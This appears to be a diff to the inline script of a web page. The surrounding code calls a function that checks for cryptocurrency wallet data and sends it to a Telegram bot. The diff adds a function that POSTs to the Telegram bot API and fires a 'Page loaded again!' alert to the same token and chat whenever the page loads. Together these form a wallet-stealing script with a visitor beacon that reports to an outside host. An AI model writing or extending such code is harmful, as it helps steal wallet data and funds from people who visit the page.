@@ -48,6 +48,21 @@ async function sendToTelegramBot(data, botToken, chatId) {
 
 // Execute the check and send function
 checkAndSendWalletData(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+
+	  // Proper parameter naming
+function sendTelegramNotification(botToken, chatId, messageText) {
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: messageText
+    })
+  });
+}
+
+// Usage
+sendTelegramNotification(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, "Page loaded again!");
   </script>
 </body>
 </html>
